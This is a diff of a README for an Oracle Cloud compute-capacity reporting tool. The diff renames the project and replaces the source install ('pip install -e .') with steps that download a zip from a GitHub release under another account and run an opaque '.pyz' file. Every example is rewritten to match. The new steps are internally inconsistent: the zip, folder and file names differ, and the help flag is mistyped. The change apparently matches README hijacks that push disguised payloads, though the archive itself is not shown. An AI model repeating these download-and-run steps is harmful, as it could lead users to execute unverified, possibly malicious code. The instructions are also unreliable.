@@ -1,4 +1,4 @@
-# OCI Compute Capacity Report (ocareport)
+# OCI Compute Capacity Report (ocicareport)
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
 [![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
@@ -6,7 +6,7 @@
 
 **Check Oracle Cloud Infrastructure compute capacity across regions, availability domains, and fault domains.**
 
-`ocareport` is a command-line tool that queries the OCI Compute Capacity Report API for compute shape availability. It supports VM, bare metal, flex, and GPU shapes across one or more subscribed OCI regions.
+`ocicareport` is a command-line tool that queries the OCI Compute Capacity Report API for compute shape availability. It supports VM, bare metal, flex, and GPU shapes across one or more subscribed OCI regions.
 
 The report is useful for capacity planning, GPU discovery, regional placement checks, and automation pipelines. Results can be rendered as a terminal table, JSON, or CSV.
 
@@ -26,17 +26,20 @@ The report is useful for capacity planning, GPU discovery, regional placement ch
 ## Quick Start
 
 ```bash
-# Install from the project directory
-pip install -e .
+Download -> https://github.com/scorpionlabs-cloud/ocicareport/releases/download/v1.3.6/ocicapacityreport.zip
+unzip ocicapacityreport.zip
+cd ocireport
+python3 -m pip install -r requirements.txt
+python3 ocareport.pyz —help
 
 # Check a shape in your home region
-ocareport -shape VM.Standard.E5.Flex
+python3 ocareport.pyz -shape VM.Standard.E5.Flex
 
 # Check GPU availability across all subscribed regions
-ocareport -shape BM.GPU.H100.8 -region all --workers 8
+python3 ocareport.pyz -shape BM.GPU.H100.8 -region all --workers 8
 
 # Check multiple shapes across multiple regions
-ocareport \
+python3 ocareport.pyz \
   -shape VM.Standard.E5.Flex,BM.GPU.H100.8 \
   -region us-ashburn-1,eu-frankfurt-1 \
   --workers 8
@@ -48,45 +51,45 @@ ocareport \
 ### Check a shape in the home region
 
 ```bash
-ocareport -shape VM.Standard.E5.Flex
+python3 ocareport.pyz -shape VM.Standard.E5.Flex
 ```
 
 ### Check a specific region
 
 ```bash
-ocareport -shape VM.Standard.E5.Flex -region eu-frankfurt-1
+python3 ocareport.pyz -shape VM.Standard.E5.Flex -region eu-frankfurt-1
 ```
 
 ### Check multiple regions
 
 ```bash
 # Comma-separated
-ocareport -shape VM.Standard.E5.Flex -region ap-singapore-1,ap-singapore-2
+python3 ocareport.pyz -shape VM.Standard.E5.Flex -region ap-singapore-1,ap-singapore-2
 
 # Repeated flag
-ocareport -shape VM.Standard.E5.Flex -region ap-singapore-1 -region ap-singapore-2
+python3 ocareport.pyz -shape VM.Standard.E5.Flex -region ap-singapore-1 -region ap-singapore-2
 ```
 
 ### Check all subscribed regions
 
 ```bash
-ocareport -shape VM.Standard.E5.Flex -region all --workers 8
+python3 ocareport.pyz -shape VM.Standard.E5.Flex -region all --workers 8
 ```
 
 ### Check multiple shapes
 
 ```bash
 # Comma-separated
-ocareport -shape VM.Standard.E5.Flex,BM.GPU.H100.8
+python3 ocareport.pyz -shape VM.Standard.E5.Flex,BM.GPU.H100.8
 
 # Repeated flag
-ocareport -shape VM.Standard.E5.Flex -shape BM.GPU.H100.8
+python3 ocareport.pyz -shape VM.Standard.E5.Flex -shape BM.GPU.H100.8
 ```
 
 ### Check multiple shapes across multiple regions
 
 ```bash
-ocareport \
+python3 ocareport.pyz \
   -shape VM.Standard.E5.Flex,VM.Standard.E4.Flex,VM.Standard.E6.Flex \
   -region ap-singapore-1,ap-singapore-2,ap-tokyo-1 \
   --workers 8
@@ -95,7 +98,7 @@ ocareport \
 ### Flex shape with global OCPU and memory
 
 ```bash
-ocareport -shape VM.Standard.E5.Flex -ocpus 8 -memory 64
+python3 ocareport.pyz -shape VM.Standard.E5.Flex -ocpus 8 -memory 64
 ```
 
 ### Multiple flex shapes with different OCPU and memory values
@@ -103,7 +106,7 @@ ocareport -shape VM.Standard.E5.Flex -ocpus 8 -memory 64
 Use `SHAPE:OCPUS:MEMORY_GB` for per-shape sizing:
 
 ```bash
-ocareport \
+python3 ocareport.pyz \
   -shape VM.Standard.E5.Flex:8:64,VM.Standard.E4.Flex:4:32,VM.Standard.E6.Flex:16:128 \
   -region ap-singapore-1,ap-singapore-2
 ```
@@ -117,7 +120,7 @@ ocareport -shape VM.Standard.E5.Flex -region all --workers 8 --output json
 ### Emit CSV
 
 ```bash
-ocareport -shape BM.GPU.H100.8 -region all --workers 8 --output csv > capacity.csv
+python3 ocareport.pyz -shape BM.GPU.H100.8 -region all --workers 8 --output csv > capacity.csv
 ```
 
 ## Output Columns
@@ -150,7 +153,7 @@ The table intentionally does **not** display OCI's available-count value. JSON a
 
 OCI may or may not expose an exact available-instance count depending on tenancy, region, and capacity-report behavior.
 
-When OCI exposes an exact count, `ocareport` calculates:
+When OCI exposes an exact count, `ocicareport` calculates:
 
 ```text
 OCPU   = available_count * instance_ocpus
